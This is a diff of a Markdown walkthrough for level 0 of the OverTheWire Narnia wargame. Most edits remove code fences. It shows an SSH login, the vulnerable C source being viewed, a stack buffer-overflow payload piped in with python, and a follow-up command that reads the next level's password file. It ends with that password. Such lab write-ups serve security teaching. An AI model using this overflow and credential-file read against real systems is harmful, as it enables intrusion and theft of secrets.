@@ -1,7 +1,7 @@
 ```bash
 ┏━•  ~
 ┗  ssh narnia0@narnia.labs.overthewire.org -p 2226
-```
+
 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
 
 narnia0@narnia.labs.overthewire.org's password:
@@ -84,10 +84,8 @@ www. `---` ver     '---' he       '---" ire.org
 
   Enjoy your stay!
 
-```bash
-narnia0@narnia:~$ cat /narnia/narnia0.c
-```
-```c                                                                                                                                /*
+
+narnia0@narnia:~$ cat /narnia/narnia0.c                                                                                                                               /*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
@@ -126,17 +124,14 @@ int main(){
     }
     
     return 0;
-}```
-```bash
+}
 narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
-```
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
-```bash
 narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
-```
 Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
+```
 `efeidiedae`  <- password for narnia1           
